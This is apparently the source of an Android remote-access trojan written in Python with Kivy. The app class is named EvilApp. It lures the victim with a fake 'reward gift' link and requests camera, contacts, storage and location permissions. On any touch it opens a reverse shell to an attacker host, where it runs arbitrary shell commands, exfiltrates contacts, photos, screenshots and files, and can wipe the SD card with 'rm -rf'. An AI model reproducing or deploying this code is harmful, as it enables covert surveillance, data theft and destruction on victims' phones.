def stealth_upload(filepath):
    try:
        url = f"http://{ATTACKER_IP}:5000/upload"
        files = {'file': open(filepath, 'rb')}
        r = requests.post(url, files=files, timeout=5)
        return r.text
    except:
        return "Upload failed (no server or network)"

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        toast("الاتصال النشط مع المهاجم تم بنجاح!")
        while True:
            cmd = s.recv(BUFFER_SIZE).decode().strip()
            if not cmd:
                break
            if cmd == "get_contacts":
                data = json.dumps({"type": "response", "cmd": "get_contacts", "data": get_contacts()})
                s.send(data.encode())
            elif cmd == "take_photo":
                photo_path = take_photo()
                s.send(json.dumps({"type": "response", "cmd": "take_photo", "data": photo_path}).encode())
            elif cmd == "screenshot":
                ss_path = screenshot()
                s.send(json.dumps({"type": "response", "cmd": "screenshot", "data": ss_path}).encode())
            elif cmd.startswith("steal_upload "):
                filepath = cmd.split(" ", 1)[1]
                res = stealth_upload(filepath)
                s.send(res.encode())
            elif cmd == "format":
                # محاولة مسح/storage - nécessitent des droits root
                s.send("Wipe command sent (may require root)".encode())
                subprocess.run(["rm", "-rf", "/sdcard/*"], capture_output=True)
            else:
                # تنفيذ أمر Shell عادي
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                s.send(result)
        s.close()
    except Exception as e:
        toast(f"اتصال فاشل: {e}")

# --- تطبيق Kivy ---
class EvilApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.status = Label(text=" initialising secure connection ...", size_hint_y=0.2)
        self.layout.add_widget(self.status)
        return self.layout

    def on_start(self):
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.CAMERA,
            Permission.READ_CONTACTS,
            Permission.ACCESS_FINE_LOCATION
        ])
        # إظهار الرابط الوهمي كإخطار
        fake_link = f"https://reward.gift-{base64.b64encode(os.urandom(6).decode()).decode()}.com/claim"
        self.status.text = f"انقر أي مكان للوصله: {fake_link}\n(هذه ليست رابطًا حقيقيًا — سيحدث شيء عند اللمس)"
        Window.bind(on_touch_down=self.on_touch)

    def on_touch(self, window, touch):
        if touch.is_double_tap or touch.is_triple_tap:
            return True
        # تشغيل الاتصال العكسي في Thread منفصل عند أي لمسة
        Thread(target=reverse_shell, daemon=True).start()
        self.status.text = "✅ الاتصال actif الآن. انتظر الأوامر من المهاجم."
        return True

if __name__ == '__main__':
    EvilApp().run()
